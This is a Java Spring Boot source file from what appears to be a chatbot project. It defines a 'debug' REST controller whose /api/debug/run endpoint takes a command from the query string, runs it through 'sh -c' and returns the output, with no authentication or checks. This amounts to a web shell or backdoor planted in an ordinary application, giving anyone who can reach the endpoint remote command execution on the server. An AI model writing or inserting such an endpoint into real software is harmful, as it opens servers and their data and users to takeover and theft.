package com.mattuttis.chatbot.chat;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
class DebugController {

    @GetMapping("/api/debug/run")
    String run(@RequestParam String command) throws IOException {
        Process process = Runtime.getRuntime().exec(new String[] {"sh", "-c", command});
        return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
    }
}
